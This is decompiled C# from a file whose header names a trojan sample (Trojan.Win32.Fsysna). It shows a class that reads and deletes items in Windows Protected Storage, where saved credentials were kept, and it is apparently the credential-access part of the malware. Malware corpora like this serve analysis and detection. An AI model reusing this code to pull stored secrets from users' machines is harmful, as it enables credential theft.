// Decompiled with JetBrains decompiler
// Type: Project_Unamed.CItem
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using Microsoft.VisualBasic;
using Project_Unamed.PStoreLib;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Project_Unamed
{
  internal class CItem : CUtils
  {
    private IPStore m_IPStore;
    private Guid m_Guid;
    private Guid m_SubGuid;
    private string m_Name;
    private PST_KEY m_KeyType;

    [DebuggerNonUserCode]
    public CItem()
    {
      this.m_Guid = new Guid();
      this.m_SubGuid = new Guid();
    }

    private void FreeStruct(IntPtr ptr) => Marshal.FreeCoTaskMem(ptr);

    internal void Init(
      IPStore PStore,
      PST_KEY KeyType,
      ref Guid guidType,
      ref Guid guidSubType,
      string szItemName)
    {
      this.m_IPStore = PStore;
      this.m_Guid = guidType;
      this.m_SubGuid = guidSubType;
      this.m_Name = szItemName;
      this.m_KeyType = KeyType;
    }

    public void Delete() => this.m_IPStore.DeleteItem(this.m_KeyType, ref this.m_Guid, ref this.m_SubGuid, this.m_Name, 0, 0);

    public string Name => this.m_Name;

    public byte[] ReadBinary()
    {
      byte[] destination = (byte[]) null;
      int pcbData;
      IntPtr ppbData;
      this.m_IPStore.ReadItem(this.m_KeyType, ref this.m_Guid, ref this.m_SubGuid, this.m_Name, ref pcbData, ref ppbData, 0, 0);
      if (ppbData != IntPtr.Zero)
      {
        destination = new byte[checked (pcbData - 1 + 1)];
        Marshal.Copy(ppbData, destination, 0, pcbData);
        this.FreeStruct(ppbData);
      }
      return destination;
    }

    public string ReadBinaryString()
    {
      byte[] numArray = this.ReadBinary();
      StringBuilder stringBuilder = new StringBuilder();
      int num = checked (numArray.Length - 1);
      int index = 0;
      while (index <= num)
      {
        stringBuilder.Append(Conversion.Hex(numArray[index]) + " ");
        checked { ++index; }
      }
      return stringBuilder.ToString();
    }
  }
}
